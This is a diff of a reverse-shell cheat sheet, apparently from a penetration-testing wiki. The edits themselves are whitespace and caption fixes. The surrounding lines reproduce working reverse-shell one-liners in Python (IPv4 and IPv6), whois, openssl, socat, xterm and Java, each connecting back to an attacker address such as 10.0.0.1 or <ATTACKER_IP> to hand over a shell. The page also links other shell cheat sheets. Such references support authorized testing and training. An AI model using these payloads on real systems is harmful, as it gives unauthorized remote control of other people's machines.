@@ -82,7 +82,7 @@ export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X
 export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 #IPv6
-python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");' 
+python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
 ```
 
 ## Perl
@@ -194,7 +194,7 @@ openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_cli
 
 ```bash
 victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
-attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337 
+attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
 ```
 
 ### Reverse shell
@@ -255,13 +255,13 @@ BEGIN {
 
 ## Xterm
 
-One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you \(10.0.0.1\) on TCP port 6001.
+One of the simplest forms of reverse shell is an xterm session. The following command should be run on the server. It will try to connect back to you \(10.0.0.1\) on TCP port 6001.
 
 ```bash
 xterm -display 10.0.0.1:1
 ```
 
-To catch the incoming xterm, start an X-Server \(:1 – which listens on TCP port 6001\).  One way to do this is with Xnest \(to be run on your system\):
+To catch the incoming xterm, start an X-Server \(:1 – which listens on TCP port 6001\). One way to do this is with Xnest \(to be run on your system\):
 
 ```bash
 Xnest :1
@@ -286,13 +286,11 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 ## Bibliography
 
-{% embed url="https://highon.coffee/blog/reverse-shell-cheat-sheet/" %}
+{% embed url="https://highon.coffee/blog/reverse-shell-cheat-sheet/" caption="" %}
 
-{% embed url="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell" %}
+{% embed url="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell" caption="" %}
 
-{% embed url="https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/" %}
+{% embed url="https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/" caption="" %}
 
-{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" %}
-
-
+{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" caption="" %}
 
